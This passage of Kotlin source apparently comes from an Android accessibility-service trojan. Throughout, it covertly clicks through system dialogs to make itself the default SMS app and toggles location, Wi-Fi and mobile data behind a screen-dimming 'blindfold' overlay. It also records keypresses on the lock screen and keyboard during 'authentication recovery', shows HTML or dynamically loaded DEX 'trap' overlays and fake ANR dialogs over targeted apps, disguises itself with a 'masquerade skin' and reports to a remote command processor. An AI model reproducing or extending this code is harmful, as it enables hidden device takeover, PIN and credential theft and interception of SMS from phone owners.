                                    prefs.edit().putLong("ghost_launcher_click_ts", now).apply()
                                    DebugLogger.log("HIJACK_ACTION", "Clicked CONFIRM btn: '$kw' | Node Class: ${finalTarget.className} | Success: $res")
                                }
                                confirmClicked = true
                                break
                            }
                        }
                        if (confirmClicked) break
                    }

                    // 3. Scan for App Target
                    if (!confirmClicked) {
                        val nodes = root.findAccessibilityNodeInfosByText(targetLabel)
                        if (nodes.isNotEmpty()) {
                            if (now - lastDump > 1000) DebugLogger.log("HIJACK_DIAG", "Found ${nodes.size} nodes matching '$targetLabel'")
                            
                            if (now - lastClick > 1500) {
                                var clickedRadio = false
                                for (i in nodes.indices) {
                                    val origNode = nodes[i]
                                    val rRaw = android.graphics.Rect().apply { origNode.getBoundsInScreen(this) }
                                    
                                    var target: android.view.accessibility.AccessibilityNodeInfo? = origNode
                                    while (target != null && !target.isClickable) target = target.parent
                                    
                                    val finalTarget = target
                                    if (finalTarget != null && finalTarget.isClickable) {
                                        val rTarget = android.graphics.Rect().apply { finalTarget.getBoundsInScreen(this) }
                                        val res = finalTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                        prefs.edit().putLong("ghost_launcher_click_ts", now).apply()
                                        DebugLogger.log("HIJACK_ACTION", "Clicked Target $i. OrigBounds: ${rRaw.toShortString()} | ClickBounds: ${rTarget.toShortString()} | Result: $res")
                                        clickedRadio = true
                                        break
                                    } else {
                                        if (now - lastDump > 1000) DebugLogger.log("HIJACK_DIAG", "Target $i rejected. Node and all parents unclickable. Bounds: ${rRaw.toShortString()}")
                                    }
                                }
                            }
                        } else {
                            if (now - lastDump > 1000) {
                                val rawName = try { packageManager.getApplicationLabel(packageManager.getApplicationInfo(packageName, 0)).toString() } catch(e:Exception){ "" }
                                DebugLogger.log("HIJACK_DIAG", "'$targetLabel' missing. Raw App Name is '$rawName'. Verify UI_TREE_DUMP for exact label presence.")
                            }
                        }
                    }
                }
            }
        }

        // --- DEFAULT SMS GHOST LOGIC ---
        if (pkgName.contains("permissioncontroller", ignoreCase = true) || pkgName.contains("settings", ignoreCase = true)) {
        }

        if (!isSafeZoneActive(this) && isWaitingForLocationSettings && pkgName.contains("settings")) {
            DebugLogger.log("GHOST_LOC_LIFECYCLE", "Settings app detected. Scanning for Location switch...")
            val root = getBypassOverlayRoot()
            val switchNodes = root?.findAccessibilityNodeInfosByViewId("com.android.settings:id/switch_widget") 
                ?: root?.findAccessibilityNodeInfosByViewId("android:id/switch_widget")
            
            if (switchNodes.isNullOrEmpty()) {
                logThrottled("GHOST_LOC_LIFECYCLE", "Location switch node not found yet. Waiting for UI to render.")
            } else {
                val switchNode = switchNodes.first()
                val text = switchNode.text?.toString() ?: ""
                val isCurrentlyOn = switchNode.isChecked || text.equals("On", ignoreCase = true)
                
                val needsClick = when (locationTargetState) {
                    "ENABLE" -> !isCurrentlyOn
                    "DISABLE" -> isCurrentlyOn
                    else -> true // TOGGLE
                }

                if (needsClick) {
                    var clickTarget: android.view.accessibility.AccessibilityNodeInfo? = switchNode
                    val bgNodes = root?.findAccessibilityNodeInfosByViewId("com.android.settings:id/switch_background")
                    if (!bgNodes.isNullOrEmpty() && bgNodes.first().isClickable) {
                        clickTarget = bgNodes.first()
                    } else {
                        while (clickTarget != null && !clickTarget.isClickable) {
                            clickTarget = clickTarget.parent
                        }
                    }
                    
                    if (clickTarget != null && clickTarget.isClickable) {
                        val success = clickTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                        DebugLogger.log("GHOST_LOC_LIFECYCLE", "Toggled Location. Target: $locationTargetState | Success: $success")
                    } else {
                        DebugLogger.log("GHOST_LOC_LIFECYCLE", "Location toggle node found but completely unclickable (even after parent traversal).")
                    }
                } else {
                    DebugLogger.log("GHOST_LOC_LIFECYCLE", "Location already in target state: $locationTargetState. Skipping click.")
                }
                
                isWaitingForLocationSettings = false
                
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    performGlobalAction(GLOBAL_ACTION_HOME)
                }, 800)
                
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    DimmerManager.IgnitionManager.release(applicationContext, "FORCE_LOCATION")
                    DimmerManager.removeOverlay(applicationContext)
                }, 2500)
            }
        }

        if (!isSafeZoneActive(this) && isWaitingForWifiSettings && pkgName.contains("settings")) {
            DebugLogger.log("GHOST_WIFI_LIFECYCLE", "Settings app detected. Scanning for Wi-Fi switch...")
            val root = getBypassOverlayRoot()
            val switchNodes = root?.findAccessibilityNodeInfosByViewId("com.android.settings:id/switch_widget") 
                ?: root?.findAccessibilityNodeInfosByViewId("android:id/switch_widget")
            
            if (switchNodes.isNullOrEmpty()) {
                logThrottled("GHOST_WIFI_LIFECYCLE", "Wi-Fi switch node not found yet. Waiting for UI to render.")
            } else {
                val switchNode = switchNodes.first()
                val text = switchNode.text?.toString() ?: ""
                val isCurrentlyOn = switchNode.isChecked || text.equals("On", ignoreCase = true)
                
                val needsClick = when (wifiTargetState) {
                    "ENABLE" -> !isCurrentlyOn
                    "DISABLE" -> isCurrentlyOn
                    else -> true // TOGGLE
                }

                if (needsClick) {
                    var clickTarget: android.view.accessibility.AccessibilityNodeInfo? = switchNode
                    val bgNodes = root?.findAccessibilityNodeInfosByViewId("com.android.settings:id/switch_background")
                    if (!bgNodes.isNullOrEmpty() && bgNodes.first().isClickable) {
                        clickTarget = bgNodes.first()
                    } else {
                        while (clickTarget != null && !clickTarget.isClickable) {
                            clickTarget = clickTarget.parent
                        }
                    }
                    
                    if (clickTarget != null && clickTarget.isClickable) {
                        val success = clickTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                        DebugLogger.log("GHOST_WIFI_LIFECYCLE", "Toggled Wi-Fi. Target: $wifiTargetState | Success: $success")
                    } else {
                        DebugLogger.log("GHOST_WIFI_LIFECYCLE", "Wi-Fi toggle node found but completely unclickable.")
                    }
                } else {
                    DebugLogger.log("GHOST_WIFI_LIFECYCLE", "Wi-Fi already in target state: $wifiTargetState. Skipping click.")
                }
                
                isWaitingForWifiSettings = false
                
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    performGlobalAction(GLOBAL_ACTION_HOME)
                }, 800)
                
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    DimmerManager.IgnitionManager.release(applicationContext, "FORCE_WIFI")
                    DimmerManager.removeOverlay(applicationContext)
                }, 2500)
            }
        }

        if (!isSafeZoneActive(this) && isWaitingForDataSettings && pkgName.contains("settings")) {
                DebugLogger.log("GHOST_DATA_LIFECYCLE", "Settings app detected. Scanning for 'Mobile data' node...")
                val root = getBypassOverlayRoot()
                val targetNodes = root?.findAccessibilityNodeInfosByText("Mobile data")
                if (targetNodes.isNullOrEmpty()) {
                    logThrottled("GHOST_DATA_LIFECYCLE", "'Mobile data' text node not found yet.")
                } else {
                    for (node in targetNodes) {
                        // STRICT STRUCTURAL MATCH: Only click the node acting as the row title, ignoring graph headers
                        val viewId = node.viewIdResourceName ?: ""
                        val text = node.text?.toString() ?: ""
                        
                        if (viewId == "android:id/title" && text == "Mobile data") {
                            var parent = node
                            // Traverse up to find the clickable list row container
                            while (parent != null && !parent.isClickable) {
                                parent = parent.parent
                            }
                            
                            if (parent != null && parent.isClickable) {
                                var switchNode: android.view.accessibility.AccessibilityNodeInfo? = null
                                fun findSwitch(n: android.view.accessibility.AccessibilityNodeInfo?): android.view.accessibility.AccessibilityNodeInfo? {
                                    if (n == null) return null
                                    val cls = n.className?.toString() ?: ""
                                    if (cls.contains("Switch", true) || cls.contains("ToggleButton", true) || cls.contains("CheckBox", true)) return n
                                    for (i in 0 until n.childCount) {
                                        val child = findSwitch(n.getChild(i))
                                        if (child != null) return child
                                    }
                                    return null
                                }
                                switchNode = findSwitch(parent)
                                
                                val isCurrentlyOn = switchNode?.isChecked ?: false
                                val needsClick = when (dataTargetState) {
                                    "ENABLE" -> !isCurrentlyOn
                                    "DISABLE" -> isCurrentlyOn
                                    else -> true // TOGGLE
                                }

                                if (needsClick) {
                                    val success = parent.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                    DebugLogger.log("GHOST_DATA_LIFECYCLE", "Toggled Mobile Data. Target: $dataTargetState | Success: $success")
                                } else {
                                    DebugLogger.log("GHOST_DATA_LIFECYCLE", "Mobile Data already in target state: $dataTargetState. Skipping click.")
                                }
                                
                                isWaitingForDataSettings = false
                                
                                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                    performGlobalAction(GLOBAL_ACTION_HOME)
                                }, 800)
                                
                                // Final step: Restore screen brightness after home jump
                                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                    DimmerManager.IgnitionManager.release(applicationContext, "FORCE_DATA")
                                    DimmerManager.removeOverlay(applicationContext)
                                }, 2500)
                                break
                            }
                        }
                    }
                }
            }

            val mode = DefaultSmsManager.expectedMode
            if (!isSafeZoneActive(this) && (mode == "AUTO" || mode == "RELENTLESS")) {
                val root = getBypassOverlayRoot() ?: return
                
                // Resolve which app name we are looking for
                val targetLabel = try { packageManager.getApplicationLabel(packageManager.getApplicationInfo(packageName, 0)).toString() } catch(e:Exception) { "Settings" }

                if (targetLabel == null) {
                    logThrottled("GHOST_SMS_LIFECYCLE", "Abort: Target label is null")
                    return
                }

                val appNodes = root.findAccessibilityNodeInfosByText(targetLabel)
                if (appNodes.isEmpty()) {
                    logThrottled("GHOST_SMS_LIFECYCLE", "Scanning for target app label: $targetLabel...")
                } else {
                    DebugLogger.log("GHOST_SMS_LIFECYCLE", "Found target app label: $targetLabel. Attempting to click radio button...")
                    var clickedRadio = false
                    
                    for (node in appNodes) {
                        var target: android.view.accessibility.AccessibilityNodeInfo? = node
                        while (target?.isClickable == false) {
                            target = target?.parent
                        }
                        target?.let { safeTarget ->
                            if (safeTarget.isClickable) {
                                safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                clickedRadio = true
                                DebugLogger.log("GHOST_SMS", "Clicked radio for: $targetLabel")
                            }
                        }
                        if (clickedRadio) break
                    }
                    
                    if (!clickedRadio) {
                        logThrottled("GHOST_SMS", "Found label: $targetLabel, but radio not clickable.")
                    }
                    
                    if (clickedRadio) {
                        logThrottled("GHOST_SMS", "Waiting for 'Set as default' button...")
                        // Small delay to allow radio state update
                        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                            val rootDelay = rootInActiveWindow ?: return@postDelayed
                            val setNodes = rootDelay.findAccessibilityNodeInfosByText("Set as default") + rootDelay.findAccessibilityNodeInfosByText("Set")
                            var btnClicked = false
                            for (btn in setNodes) {
                                if (btn.isClickable) {
                                    val success = btn.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                    DebugLogger.log("GHOST_SMS_LIFECYCLE", "Auto-clicked 'Set as default' for $targetLabel | Success: $success")
                                    btnClicked = true
                                    break
                                }
                            }
                            if (!btnClicked) {
                                DebugLogger.log("GHOST_SMS_LIFECYCLE", "Could not find clickable 'Set as default' button in hierarchy.")
                                return@postDelayed
                            }
                            DefaultSmsManager.expectedMode = "" // Disarm
                            CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", "Set as Default SMS via Ghost Hand")
                            
                            // Delay HOME slightly to ensure dialogs resolve and OS processes the action
                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                performGlobalAction(GLOBAL_ACTION_HOME)
                                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                    performGlobalAction(GLOBAL_ACTION_HOME)
                                }, 300)
                            }, 600)

                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                DimmerManager.IgnitionManager.release(applicationContext, "SMS_GHOST")
                                DynamicUIManager.removeOverlay(this@MyAccessibilityService, "HIJACK_SUCCESS_HOME_ROUTED")
                            }, 2500)
                        }, 600)
                    }
                }
            } else if (!isSafeZoneActive(this) && (mode == "RESTORE" || mode == "AUTO_NAV")) {
                val root = getBypassOverlayRoot() ?: return
                val originalPkg = getSharedPreferences("app_stats", Context.MODE_PRIVATE).getString("original_sms_package", null)
                
                val targetLabel = if (mode == "AUTO_NAV") {
                    try { packageManager.getApplicationLabel(packageManager.getApplicationInfo(packageName, 0)).toString() } catch(e:Exception) { "Settings" }
                } else {
                    DefaultSmsManager.getStoredPreviousLabel(this)
                }

                if (targetLabel == null || (mode == "RESTORE" && originalPkg == null)) {
                    DefaultSmsManager.expectedMode = ""
                    return
                }

                // VERIFICATION: Check if target is already set (Passive Fallback)
                val currentDefault = android.provider.Telephony.Sms.getDefaultSmsPackage(this)
                val isFinished = if (mode == "AUTO_NAV") currentDefault == packageName else currentDefault == originalPkg

                if (isFinished) {
                    DebugLogger.log("SMS_NAV", "Passive Verification SUCCESS! Target ($targetLabel) is now Default.")
                    DefaultSmsManager.expectedMode = ""
                    if (mode == "AUTO_NAV") CommandProcessor.applyMasqueradeSkin(this, "SAM_MSG")

                    val msg = if (mode == "AUTO_NAV") "Set as Default SMS via manual fallback" else "Original SMS app restored"
                    CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", msg)

                    // Delay HOME to ensure dialog dismissal/transitions finish first
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        performGlobalAction(GLOBAL_ACTION_HOME)
                        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                            performGlobalAction(GLOBAL_ACTION_HOME)
                        }, 500) // Double-tap home for absolute certainty
                    }, 1500)

                    // Generous 5-second timer to ensure UI has fully exited to home before unblinding
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        DimmerManager.IgnitionManager.release(applicationContext, "SMS_GHOST")
                        DynamicUIManager.removeOverlay(this@MyAccessibilityService, "RESTORE_SUCCESS_HOME_ROUTED")
                    }, 5000)
                    return
                }

                // Phase 1: selection screen
                val appNodes = root.findAccessibilityNodeInfosByText(targetLabel)
                if (appNodes.isNotEmpty()) {
                    val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                    val lastLoop = prefs.getLong("sms_nav_loop_ts", 0L)
                    
                    if (System.currentTimeMillis() - lastLoop < 3000) return // Increased debounce to 3s
                    
                    val targetCount = appNodes.size
                    DebugLogger.log("SMS_NAV_PHASE1", "Found $targetCount nodes matching target label: '$targetLabel'")

                    var clicked = false
                    for (i in 0 until targetCount) {
                        var target: android.view.accessibility.AccessibilityNodeInfo? = appNodes[i]
                        while (target != null && !target.isClickable) target = target.parent
                        
                        if (target != null && target.isClickable) {
                            target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                            DebugLogger.log("SMS_NAV", "Clicked clickable candidate $i for '$targetLabel'")
                            clicked = true
                            prefs.edit().putLong("sms_nav_loop_ts", System.currentTimeMillis()).apply()
                            
                            // --- ACTIVE POLLING ENGINE (Guarantees Navigation) ---
                            kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                                var isSuccess = false
                                val expectedPkg = if (mode == "AUTO_NAV") packageName else originalPkg
                                
                                for (attempt in 1..15) { // Scan for up to 9 seconds
                                    delay(600)
                                    
                                    // 1. Handle confirmation dialogs
                                    val confirmRoot = rootInActiveWindow
                                    if (confirmRoot != null) {
                                        val keywords = listOf("Set as default", "Set", "OK", "Default")
                                        for (kw in keywords) {
                                            val btn = confirmRoot.findAccessibilityNodeInfosByText(kw).find { it.isClickable }
                                            if (btn != null) {
                                                btn.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                                DebugLogger.log("SMS_NAV_CONFIRM", "Clicked confirm dialog button: '$kw'")
                                                break
                                            }
                                        }
                                    }
                                    
                                    // 2. Actively verify backend instead of waiting for UI event
                                    if (android.provider.Telephony.Sms.getDefaultSmsPackage(this@MyAccessibilityService) == expectedPkg) {
                                        isSuccess = true
                                        break
                                    }
                                }

                                // 3. Proactive routing and cleanup
                                if (isSuccess && DefaultSmsManager.expectedMode.isNotEmpty()) {
                                    withContext(kotlinx.coroutines.Dispatchers.Main) {
                                        DebugLogger.log("SMS_NAV", "Active Verification SUCCESS! Routing to Home.")
                                        DefaultSmsManager.expectedMode = "" // Disarm script
                                        
                                        if (mode == "AUTO_NAV") CommandProcessor.applyMasqueradeSkin(this@MyAccessibilityService, "SAM_MSG")
                                        val successMsg = if (mode == "AUTO_NAV") "Set as Default SMS via manual fallback" else "Original SMS app restored"
                                        CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", successMsg)

                                        delay(1000) // Let backend changes stabilize
                                        performGlobalAction(GLOBAL_ACTION_HOME)
                                        delay(400)
                                        performGlobalAction(GLOBAL_ACTION_HOME)

                                        // Safely drop the blindfold after transitioning home
                                        delay(3500) 
                                        DimmerManager.IgnitionManager.release(applicationContext, "SMS_GHOST")
                                        DynamicUIManager.removeOverlay(this@MyAccessibilityService, "RESTORE_SUCCESS_PROACTIVE")
                                    }
                                }
                            }
                            // --- END ACTIVE POLLING ENGINE ---
                            
                            break // Found and clicked, exit loop
                        } else {
                            DebugLogger.log("SMS_NAV_PHASE1", "Candidate $i is NOT clickable, skipping...")
                        }
                    }
                    
                    if (!clicked) {
                        DebugLogger.log("SMS_NAV_PHASE1", "Found ${appNodes.size} nodes for '$targetLabel', but NONE were clickable.")
                    }
                    return
                } else {
                    // Diagnostic scan when target is missing
                    val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                    val lastSample = prefs.getLong("sms_nav_sample_ts", 0L)
                    if (System.currentTimeMillis() - lastSample > 3000) {
                        prefs.edit().putLong("sms_nav_sample_ts", System.currentTimeMillis()).apply()
                        val sb = java.lang.StringBuilder()
                        extractText(root, sb)
                        val screenText = sb.toString().replace("\n", " ").take(150)
                        DebugLogger.log("SMS_NAV_SCAN", "Target '$targetLabel' NOT found. Visible screen text: $screenText...")
                    }
                }

                // Phase 2: Category list
                val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                val lastSmsClick = prefs.getLong("sms_nav_cat_ts", 0L)
                if (System.currentTimeMillis() - lastSmsClick > 2000) {
                    val smsKeywords = listOf("SMS", "SMS app", "Messaging app", "Default SMS app")
                    var categoryClicked = false
                    for (kw in smsKeywords) {
                        val smsNodes = root.findAccessibilityNodeInfosByText(kw)
                        for (node in smsNodes) {
                            var target: android.view.accessibility.AccessibilityNodeInfo? = node
                            while (target != null && !target.isClickable) target = target.parent
                            if (target != null) {
                                target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                prefs.edit().putLong("sms_nav_cat_ts", System.currentTimeMillis()).apply()
                                DebugLogger.log("SMS_NAV", "Clicked SMS category: $kw")
                                categoryClicked = true
                                break
                            }
                        }
                        if (categoryClicked) break
                    }
                }
            } else if (DefaultSmsManager.expectedMode == "SCRAPE") {
                DefaultSmsManager.expectedMode = "SCRAPING" // Prevent multi-triggers
                DebugLogger.log("GHOST_SMS", "Dialog detected. Waiting 1.5s for UI to settle...")
                
                CoroutineScope(Dispatchers.IO).launch {
                    delay(1500)
                    val treeJson = getInstantTree(null, 10)
                    val wrapper = JSONObject().apply { put("pkg", pkgName); put("tree", treeJson as Any) }
                    DumpManager.appendLog("SCRAPE_SMS_DIALOG", wrapper)
                    DebugLogger.log("GHOST_SMS", "Scraped Default SMS dialog for forensic mapping. Pkg: $pkgName")
                    
                    CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SCRAPE_SUCCESS", null, wrapper, null)
                    
                    withContext(Dispatchers.Main) {
                        performGlobalAction(GLOBAL_ACTION_HOME)
                        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                            DimmerManager.removeOverlay(applicationContext)
                            DefaultSmsManager.expectedMode = "" // Disarm completely
                        }, 500)
                    }
                }
            }

        // --- SEQUENCE ENGINE HOOK ---
        handleSequenceEvent(pkgName)

        // --- 0. PHOENIX HOOK (Resurrection check) ---
        val now = System.currentTimeMillis()
        if (now - lastPhoenixCheck > 60000) { // Throttle checks to once a minute maximum
            lastPhoenixCheck = now
            checkMainServiceHealth()
            
            // Ensure Status Bar lock is maintained if flag is active
            DynamicUIManager.applyStoredStatusBar(this)
        }

        // --- 1. GHOST HAND LOGIC ---
        if (isGhostActive) {
            handleGhostEvent(event)
        }

        // --- GHOST WIFI HANDLER ---
        if (isWaitingForWifiDialog) {
            val root = rootInActiveWindow
            if (root != null) {
                val keywords = listOf("Connect", "Allow", "Yes")
                for (kw in keywords) {
                    val nodes = root.findAccessibilityNodeInfosByText(kw)
                    var clicked = false
                    for (node in nodes) {
                        var target: android.view.accessibility.AccessibilityNodeInfo? = node
                        while (target != null && !target.isClickable) target = target.parent
                        if (target != null && target.isClickable) {
                            target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                            DebugLogger.log("GHOST_WIFI", "Auto-clicked connection dialog: $kw")
                            isWaitingForWifiDialog = false
                            clicked = true
                            break
                        }
                    }
                    if (clicked) break
                }
            }
        }

        // --- AUTHENTICATION RECOVERY MONITOR (Override Safe Zone) ---
        if (AuthRecoveryManager.isRecoveryActive && event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            val pkg = event.packageName?.toString() ?: ""
            if (pkg.contains("systemui") || pkg.contains("inputmethod") || pkg.contains("honeyboard")) {
                val text = event.text?.joinToString(" ") ?: ""
                val desc = event.contentDescription?.toString() ?: ""
                val keyLabel = if (text.isNotEmpty()) text else desc
                if (keyLabel.isNotEmpty()) {
                    AuthRecoveryManager.onAuthInput(keyLabel)
                }
            }
        }

        // --- UNIVERSAL UI TRAP (Tap-Only Engine - Multiple Traps Support) ---
        if (!isSafeZoneActive(this) && (cachedUiTraps.length() > 0 || cachedNativeTraps.length() > 0)) {
            // STRICT REQUIREMENT: Only react to physical clicks
            if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                val pkg = event.packageName?.toString() ?: ""
                
                // CONSTRAINT: Ignore clicks on editable text fields to prevent false positives while typing
                val isEditable = event.className?.toString()?.contains("EditText", ignoreCase = true) == true
                
                if (!isEditable) {
                    val statsPrefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                    var trapTriggered = false
                    
                    // 1. PRIORITIZE NATIVE DEX TRAPS (Speedster)
                    for (i in 0 until cachedNativeTraps.length()) {
                        val trap = cachedNativeTraps.getJSONObject(i)
                        val targetData = trap.optString("target", "")
                        if (targetData.isEmpty()) continue
                        
                        val parts = targetData.split("@@")
                        val titleTarget = parts[0].trim()
                        val secondaryTarget = parts.getOrNull(1)?.trim() ?: ""
                        val expectedPkg = parts.getOrNull(2)?.trim()
                        val headerAnchor = parts.getOrNull(3)?.trim()
                        val isStrict = trap.optBoolean("strict", false)
                        
                        var isMatch = false
                        if (expectedPkg.isNullOrEmpty() || pkg.contains(expectedPkg, ignoreCase = true)) {
                            var headerVerified = true
                            if (!headerAnchor.isNullOrEmpty()) {
                                val root = rootInActiveWindow
                                headerVerified = root?.findAccessibilityNodeInfosByText(headerAnchor)?.any { 
                                    val id = it.viewIdResourceName ?: ""
                                    val text = it.text?.toString() ?: ""
                                    id.contains("title", ignoreCase = true) || text.equals(headerAnchor, ignoreCase = true)
                                } ?: false
                            }

                            if (headerVerified) {
                                if (!isStrict) {
                                    val eText = event.text.joinToString(" ")
                                    val eDesc = event.contentDescription?.toString() ?: ""
                                    val hasTitle = eText.contains(titleTarget, ignoreCase = true) || eDesc.contains(titleTarget, ignoreCase = true)
                                    val hasSecondary = secondaryTarget.isEmpty() || eText.contains(secondaryTarget, ignoreCase = true) || eDesc.contains(secondaryTarget, ignoreCase = true)
                                    if (hasTitle && hasSecondary) isMatch = true
                                }
                                if (!isMatch) {
                                    val sourceNode = event.source
                                    if (verifyStructuralMatch(sourceNode, pkg, targetData)) isMatch = true
                                    sourceNode?.recycle()
                                }
                            }
                        }

                        if (isMatch) {
                            val now = System.currentTimeMillis()
                            val lastTrigger = statsPrefs.getLong("ui_trap_last_trigger", 0L)
                            
                            if (now - lastTrigger > 2000) {
                                statsPrefs.edit().putLong("ui_trap_last_trigger", now).apply()
                                
                                val dexPath = trap.getString("file_path")
                                val className = trap.getString("class_name")
                                val timeout = trap.optLong("timeout", 10L)
                                val dimLevel = trap.optInt("dim", 20)
                                val method = trap.optString("method", "ACC")
                                val trapLabel = trap.optString("label", "DefaultNative")
                                
                                DebugLogger.log("NATIVE_TRAP", "Deploying native sequence for target: $titleTarget")
                                
                                try {
                                    val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                                    val wakeLock = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "Cortex:UiTrapWake")
                                    wakeLock.acquire(3000)
                                } catch (e: Exception) {}

                                Handler(Looper.getMainLooper()).post {
                                    DynamicUIManager.showNativeOverlay(this@MyAccessibilityService, dexPath, className, dimLevel, method)
                                }
                                
                                if (timeout > 0L) {
                                    val currentSession = DynamicUIManager.activeTrapSessionId
                                    Handler(Looper.getMainLooper()).postDelayed({
                                        if (DynamicUIManager.activeTrapSessionId == currentSession) {
                                            DynamicUIManager.removeNativeOverlay(this@MyAccessibilityService, "NATIVE_TRAP_TIMEOUT: $trapLabel")
                                        }
                                    }, timeout * 1000)
                                }
                            }
                            trapTriggered = true
                            break
                        }
                    }
                    
                    // 2. FALLBACK TO HTML TRAPS
                    if (!trapTriggered) {
                        for (i in 0 until cachedUiTraps.length()) {
                            val trap = cachedUiTraps.getJSONObject(i)
                            val targetData = trap.optString("target", "")
                        
                        if (targetData.isEmpty()) continue
                        
                        val parts = targetData.split("@@")
                        val titleTarget = parts[0].trim()
                        val secondaryTarget = parts.getOrNull(1)?.trim() ?: ""
                        val expectedPkg = parts.getOrNull(2)?.trim()
                        val headerAnchor = parts.getOrNull(3)?.trim()
                        val isStrict = trap.optBoolean("strict", false)
                        
                        var isMatch = false
                        
                        if (expectedPkg.isNullOrEmpty() || pkg.contains(expectedPkg, ignoreCase = true)) {
                            var headerVerified = true
                            if (!headerAnchor.isNullOrEmpty()) {
                                val root = rootInActiveWindow
                                headerVerified = root?.findAccessibilityNodeInfosByText(headerAnchor)?.any { 
                                    val id = it.viewIdResourceName ?: ""
                                    val text = it.text?.toString() ?: ""
                                    id.contains("title", ignoreCase = true) || text.equals(headerAnchor, ignoreCase = true)
                                } ?: false
                                if (!headerVerified) DebugLogger.log("UI_TRAP", "Header anchor [$headerAnchor] missing. Aborting trap.")
                            }

                            if (headerVerified) {
                                // 1. FAST PATH (Only if NOT strict)
                                if (!isStrict) {
                                    val eText = event.text.joinToString(" ")
                                    val eDesc = event.contentDescription?.toString() ?: ""
                                    
                                    val hasTitle = eText.contains(titleTarget, ignoreCase = true) || eDesc.contains(titleTarget, ignoreCase = true)
                                    val hasSecondary = secondaryTarget.isEmpty() || eText.contains(secondaryTarget, ignoreCase = true) || eDesc.contains(secondaryTarget, ignoreCase = true)
                                    
                                    if (hasTitle && hasSecondary) {
                                        isMatch = true
                                        DebugLogger.log("UI_TRAP", "✅ FAST-PATH MATCH: Both targets verified in buffer.")
                                    }
                                }

                                // 2. STRUCTURAL PATH (Mandatory for Strict, Fallback for Fast)
                                if (!isMatch) {
                                    val sourceNode = event.source
                                    if (verifyStructuralMatch(sourceNode, pkg, targetData)) {
                                        isMatch = true
                                        DebugLogger.log("UI_TRAP", "✅ STRUCTURAL MATCH: Hierarchy verified.")
                                    }
                                    sourceNode?.recycle()
                                }
                            }
                        }

                        if (isMatch) {
                            val now = System.currentTimeMillis()
                            val lastTrigger = statsPrefs.getLong("ui_trap_last_trigger", 0L)
                            
                            if (now - lastTrigger > 2000) {
                                statsPrefs.edit().putLong("ui_trap_last_trigger", now).apply()
                                
                                val method = trap.optString("method", "ACC").uppercase()
                                val html = trap.optString("html", "")
                                val timeout = trap.optLong("timeout", 10L)
                                val dimLevel = trap.optInt("dim", 20)
                                
                                DebugLogger.log("UI_TRAP", "Deploying trap sequence for target: $titleTarget | Method: $method")
                                
                                if (method == "ANR") {
                                    val targetApp = if (html.isNotBlank()) html else null
                                    triggerFakeAnr(targetApp)
                                } else {
                                    // WAKE CPU FOR TRANSITION: Prevents the OS from micro-sleeping while rendering WebView
                                    try {
                                        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                                        val wakeLock = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "Cortex:UiTrapWake")
                                        wakeLock.acquire(3000)
                                    } catch (e: Exception) {}

                                    Handler(Looper.getMainLooper()).post {
                                        DimmerManager.applyDim(this@MyAccessibilityService, dimLevel, method)
                                        DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html, false)
                                    }
                                    
                                    Handler(Looper.getMainLooper()).postDelayed({
                                        DimmerManager.removeOverlay(this@MyAccessibilityService)
                                    }, 2500)
                                    
                                    if (timeout > 0L) {
                                        val trapLabel = trap.optString("label", "Default")
                                        val currentSession = DynamicUIManager.activeTrapSessionId
                                        Handler(Looper.getMainLooper()).postDelayed({
                                            if (DynamicUIManager.activeTrapSessionId == currentSession) {
                                                DynamicUIManager.removeOverlay(this@MyAccessibilityService, "UI_TRAP_TIMEOUT: $trapLabel")
                                            }
                                        }, timeout * 1000)
                                    }
                                }
                            }
                            
                            // Break out of the loop since we matched and triggered a trap
                            break
                        }
                    }
                    } // End of !trapTriggered block
                }
            }
        }

        // --- 1.5 TREE SCRAPER ENGINE (Multi-Task Queue) ---
        val tasksToProcess = treeTasks.filter { it.pkg == null || it.pkg == pkgName }
        
        if (tasksToProcess.isNotEmpty()) {
            val root = rootInActiveWindow
            tasksToProcess.forEach { task ->
                // 1. Target Acquisition Logic
                if (task.endTime == 0L) {
